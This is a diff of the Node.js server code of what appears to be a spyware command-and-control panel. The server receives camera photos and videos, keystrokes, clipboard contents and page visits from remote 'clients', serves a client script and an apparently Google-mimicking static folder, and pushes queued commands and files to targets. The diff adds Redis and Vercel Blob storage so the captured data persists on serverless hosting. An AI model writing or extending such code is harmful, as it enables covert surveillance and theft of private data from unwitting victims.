@@ -5,9 +5,27 @@ const cors = require('cors');
 const fs = require('fs');
 const http = require('http');
 const IS_VERCEL = !!process.env.VERCEL;
+const USE_REDIS = !!(process.env.UPSTASH_REDIS_REST_URL);
+const USE_BLOB  = !!(process.env.BLOB_READ_WRITE_TOKEN);
 const { Server } = IS_VERCEL ? { Server: null } : require('socket.io');
 let localtunnel;
 if (!IS_VERCEL) { try { localtunnel = require('localtunnel'); } catch (e) {} }
+
+// ── Upstash Redis ─────────────────────────────────────────────
+let redis = null;
+if (USE_REDIS) {
+    const { Redis } = require('@upstash/redis');
+    redis = new Redis({
+        url: process.env.UPSTASH_REDIS_REST_URL,
+        token: process.env.UPSTASH_REDIS_REST_TOKEN,
+    });
+}
+
+// ── Vercel Blob ───────────────────────────────────────────────
+let blobPut = null;
+if (USE_BLOB) {
+    blobPut = require('@vercel/blob').put;
+}
 
 // ═══════════════════════════════════════════════════════════════
 //  APP SETUP
@@ -29,7 +47,9 @@ const DATA_DIR = IS_VERCEL ? '/tmp' : path.join(__dirname, 'data');
 //  PERSISTENT DATA STORE
 // ═══════════════════════════════════════════════════════════════
 const DATA_FILE = IS_VERCEL ? '/tmp/store.json' : path.join(__dirname, 'data', 'store.json');
+const REDIS_KEY = 'app:store';
 let saveTimeout = null;
+let storeLoaded  = false;
 
 function getDefaultStore() {
     return {
@@ -40,23 +60,44 @@ function getDefaultStore() {
     };
 }
 
+// ── Sync file load (local only) ───────────────────────────────
 function loadStore() {
+    if (USE_REDIS) return getDefaultStore(); // Redis loads async via middleware
     try {
         if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
     } catch (e) { console.error('Store load failed:', e.message); }
     return getDefaultStore();
 }
 
+// ── Async Redis load (called once on first request) ───────────
+async function loadStoreFromRedis() {
+    if (!redis) return null;
+    try {
+        const data = await redis.get(REDIS_KEY);
+        if (data) return typeof data === 'object' ? data : JSON.parse(data);
+    } catch (e) { console.error('Redis load failed:', e.message); }
+    return null;
+}
+
+// ── Save (Redis or file) ──────────────────────────────────────
 function saveStore() {
     if (saveTimeout) clearTimeout(saveTimeout);
     saveTimeout = setTimeout(() => {
-        try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); }
-        catch (e) { console.error('Store save failed:', e.message); }
+        if (USE_REDIS && redis) {
+            redis.set(REDIS_KEY, store).catch(e => console.error('Redis save failed:', e.message));
+        } else {
+            try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); }
+            catch (e) { console.error('Store save failed:', e.message); }
+        }
     }, 500);
 }
 
 function forceSave() {
-    try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch (e) {}
+    if (USE_REDIS && redis) {
+        redis.set(REDIS_KEY, store).catch(() => {});
+    } else {
+        try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch (e) {}
+    }
 }
 process.on('SIGINT', () => { forceSave(); process.exit(0); });
 process.on('SIGTERM', () => { forceSave(); process.exit(0); });
@@ -204,13 +245,31 @@ app.use((req, res, next) => {
 app.use('/uploads', express.static(UPLOAD_BASE));
 app.use(express.static(path.join(__dirname, 'googl')));
 
+// ── Lazy-load store from Redis on first request ───────────────
+app.use(async (req, res, next) => {
+    if (USE_REDIS && !storeLoaded) {
+        storeLoaded = true;
+        const redisStore = await loadStoreFromRedis();
+        if (redisStore) {
+            Object.assign(store, redisStore);
+            const defs = getDefaultStore();
+            Object.keys(defs).forEach(k => { if (!store[k]) store[k] = defs[k]; });
+            console.log('Loaded store from Redis');
+        }
+    }
+    next();
+});
+
 // ═══════════════════════════════════════════════════════════════
 //  MULTER
 // ═══════════════════════════════════════════════════════════════
+// Memory storage for Blob uploads; disk storage for local
+const memoryUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 100 * 1024 * 1024 } });
+
 function makeUploader(subdir) {
     return multer({
         storage: multer.diskStorage({
-            destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/${subdir}/`),// Note: UPLOAD_BASE is set above
+            destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/${subdir}/`),
             filename: (req, file, cb) => {
                 const ext = path.extname(file.originalname) || '.webm';
                 cb(null, `${req.body.clientId || 'unknown'}_${Date.now()}${ext}`);
@@ -219,11 +278,11 @@ function makeUploader(subdir) {
         limits: { fileSize: 50 * 1024 * 1024 }
     });
 }
-const uploadMedia = makeUploader('videos');
-const uploadPhoto = makeUploader('photos');
-const uploadCommandFile = multer({
+const uploadMedia = USE_BLOB ? null : makeUploader('videos');
+const uploadPhoto = USE_BLOB ? null : makeUploader('photos');
+const uploadCommandFile = USE_BLOB ? null : multer({
     storage: multer.diskStorage({
-        destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/files/`),// Note: UPLOAD_BASE is set above
+        destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/files/`),
         filename: (req, file, cb) => {
             const ext = path.extname(file.originalname);
             const base = path.basename(file.originalname, ext).replace(/[^a-z0-9_\-]/gi, '_').slice(0, 60);
@@ -244,21 +303,30 @@ app.get('/client.js', (req, res) => {
 
 // ── Upload video/audio ──
 app.post('/upload-media', (req, res) => {
-    uploadMedia.single('media')(req, res, (err) => {
-        if (err) {
-            console.error('\u{26A0}\u{FE0F}  Upload error:', err.message);
-            return res.status(400).json({ error: err.message });
-        }
+    const doUpload = USE_BLOB ? memoryUpload.single('media') : uploadMedia.single('media');
+    doUpload(req, res, async (err) => {
+        if (err) { console.error('Upload error:', err.message); return res.status(400).json({ error: err.message }); }
         if (!req.file) return res.status(400).json({ error: 'No file' });
+        const cid = req.body.clientId || 'unknown';
+        const ext = path.extname(req.file.originalname) || '.webm';
+        const filename = req.file.filename || `${cid}_${Date.now()}${ext}`;
+        let filePath = `/uploads/videos/${filename}`;
+        if (USE_BLOB && blobPut) {
+            try {
+                const blob = await blobPut(`videos/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
+                filePath = blob.url;
+            } catch (e) { console.error('Blob upload failed:', e.message); }
+        }
         const entry = {
-            id: Date.now().toString(36), clientId: req.body.clientId || 'unknown',
-            filename: req.file.filename, size: req.file.size, mimeType: req.file.mimetype,
-            path: `/uploads/videos/${req.file.filename}`, timestamp: new Date().toISOString()
+            id: Date.now().toString(36), clientId: cid,
+            filename, size: req.file.size, mimeType: req.file.mimetype,
+            path: filePath, timestamp: new Date().toISOString()
         };
         store.media.unshift(entry);
         if (store.media.length > 500) store.media.length = 500;
-        addEvent('media', { clientId: entry.clientId, filename: entry.filename, size: entry.size });
-        console.log(`\u{1F4F9} Video from ${entry.clientId}: ${entry.filename} (${(entry.size/1024).toFixed(0)} KB)`);
+        saveStore();
+        addEvent('media', { clientId: cid, filename, size: entry.size });
+        console.log(`\u{1F4F9} Video from ${cid}: ${filename} (${(entry.size/1024).toFixed(0)} KB)`);
         res.json({ success: true, id: entry.id });
     });
 });
@@ -280,26 +348,35 @@ app.get('/api/ip-geo', async (req, res) => {
 
 // ── Upload photo ──
 app.post('/upload-photo', (req, res) => {
-    uploadPhoto.single('photo')(req, res, (err) => {
-        if (err) {
-            console.error('\u{26A0}\u{FE0F}  Photo upload error:', err.message);
-            return res.status(400).json({ error: err.message });
-        }
+    const doUpload = USE_BLOB ? memoryUpload.single('photo') : uploadPhoto.single('photo');
+    doUpload(req, res, async (err) => {
+        if (err) { console.error('Photo upload error:', err.message); return res.status(400).json({ error: err.message }); }
         if (!req.file) return res.status(400).json({ error: 'No file' });
-    const entry = {
-        id: Date.now().toString(36), clientId: req.body.clientId || 'unknown',
-        filename: req.file.filename, size: req.file.size, mimeType: req.file.mimetype,
-        path: `/uploads/photos/${req.file.filename}`, timestamp: new Date().toISOString()
-    };
-    store.photos.unshift(entry);
-    if (store.photos.length > 2000) store.photos.length = 2000;
-    if (store.clients[entry.clientId]) {
-        store.clients[entry.clientId].lastPhoto = entry.path;
-        store.clients[entry.clientId].lastPhotoTime = entry.timestamp;
-    }
-    addEvent('photo', { clientId: entry.clientId, filename: entry.filename, path: entry.path });
-    console.log(`\u{1F4F7} Photo from ${entry.clientId}: ${entry.filename}`);
-    res.json({ success: true, id: entry.id, path: entry.path });
+        const cid = req.body.clientId || 'unknown';
+        const ext = path.extname(req.file.originalname) || '.jpg';
+        const filename = req.file.filename || `${cid}_${Date.now()}${ext}`;
+        let filePath = `/uploads/photos/${filename}`;
+        if (USE_BLOB && blobPut) {
+            try {
+                const blob = await blobPut(`photos/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
+                filePath = blob.url;
+            } catch (e) { console.error('Blob photo upload failed:', e.message); }
+        }
+        const entry = {
+            id: Date.now().toString(36), clientId: cid,
+            filename, size: req.file.size, mimeType: req.file.mimetype,
+            path: filePath, timestamp: new Date().toISOString()
+        };
+        store.photos.unshift(entry);
+        if (store.photos.length > 2000) store.photos.length = 2000;
+        if (store.clients[cid]) {
+            store.clients[cid].lastPhoto = filePath;
+            store.clients[cid].lastPhotoTime = entry.timestamp;
+        }
+        addEvent('photo', { clientId: cid, filename, path: filePath });
+        saveStore();
+        console.log(`\u{1F4F7} Photo from ${cid}: ${filename}`);
+        res.json({ success: true, id: entry.id, path: filePath });
     });
 });
 
@@ -789,15 +866,25 @@ app.post('/api/config', requireAuth, (req, res) => {
 });
 
 // ── Upload file and queue as command ──
-app.post('/api/command-file', requireAuth, uploadCommandFile.single('file'), (req, res) => {
+app.post('/api/command-file', requireAuth, (USE_BLOB ? memoryUpload : uploadCommandFile).single('file'), async (req, res) => {
     if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
     const { target = 'all', customName } = req.body;
     const displayName = customName && customName.trim() ? customName.trim() : req.file.originalname;
+    const ext = path.extname(req.file.originalname);
+    const baseName = path.basename(req.file.originalname, ext).replace(/[^a-z0-9_\-]/gi, '_').slice(0, 60);
+    const filename = req.file.filename || `${baseName}_${Date.now()}${ext}`;
+    let fileUrl = `/uploads/files/${filename}`;
+    if (USE_BLOB && blobPut) {
+        try {
+            const blob = await blobPut(`files/${filename}`, req.file.buffer, { access: 'public', contentType: req.file.mimetype });
+            fileUrl = blob.url;
+        } catch (e) { console.error('Blob file upload failed:', e.message); }
+    }
     const cmd = {
         id: Date.now().toString(36),
         type: 'file',
         data: {
-            url: `/uploads/files/${req.file.filename}`,
+            url: fileUrl,
             filename: displayName,
             size: req.file.size,
             mimeType: req.file.mimetype
@@ -842,12 +929,12 @@ app.get('/api/storage', requireAuth, (req, res) => {
     const countDir = dir => {
         try { return fs.readdirSync(dir).reduce((s, f) => { try { return s + fs.statSync(path.join(dir, f)).size; } catch { return s; } }, 0); } catch { return 0; }
     };
-    const photoSize = countDir(path.join(__dirname, 'uploads', 'photos'));
-    const videoSize = countDir(path.join(__dirname, 'uploads', 'videos'));
+    const photoSize = USE_BLOB ? 0 : countDir(path.join(__dirname, 'uploads', 'photos'));
+    const videoSize = USE_BLOB ? 0 : countDir(path.join(__dirname, 'uploads', 'videos'));
     res.json({
-        totalMB: ((photoSize + videoSize) / 1048576).toFixed(1),
-        photoMB: (photoSize / 1048576).toFixed(1), photoCount: store.photos.length,
-        videoMB: (videoSize / 1048576).toFixed(1), videoCount: store.media.length
+        totalMB: USE_BLOB ? 'Stored in Vercel Blob' : ((photoSize + videoSize) / 1048576).toFixed(1),
+        photoMB: USE_BLOB ? 'Blob' : (photoSize / 1048576).toFixed(1), photoCount: store.photos.length,
+        videoMB: USE_BLOB ? 'Blob' : (videoSize / 1048576).toFixed(1), videoCount: store.media.length
     });
 });
 
@@ -857,17 +944,19 @@ app.post('/api/cleanup', requireAuth, (req, res) => {
     if (type === 'photos') {
         const k = parseInt(keep) || 0;
         const rm = k === 0 ? store.photos.splice(0) : store.photos.splice(k);
-        rm.forEach(p => { try { fs.unlinkSync(path.join(__dirname, p.path)); deleted++; } catch {} });
+        if (!USE_BLOB) rm.forEach(p => { try { fs.unlinkSync(path.join(__dirname, p.path)); deleted++; } catch {} });
+        else deleted = rm.length;
     } else if (type === 'videos') {
         const k = parseInt(keep) || 0;
         const rm = k === 0 ? store.media.splice(0) : store.media.splice(k);
-        rm.forEach(m => { try { fs.unlinkSync(path.join(__dirname, m.path)); deleted++; } catch {} });
+        if (!USE_BLOB) rm.forEach(m => { try { fs.unlinkSync(path.join(__dirname, m.path)); deleted++; } catch {} });
+        else deleted = rm.length;
     } else if (type === 'events') { store.events = []; }
       else if (type === 'keystrokes') { store.keystrokes = []; }
       else if (type === 'clipboard') { store.clipboard = []; }
       else if (type === 'visits') { store.pageVisits = []; }
     saveStore();
-    console.log(`\u{1F9F9} Cleanup: ${type}, ${deleted} files removed`);
+    console.log(`\u{1F9F9} Cleanup: ${type}, ${deleted} removed`);
     res.json({ success: true, deleted });
 });
 
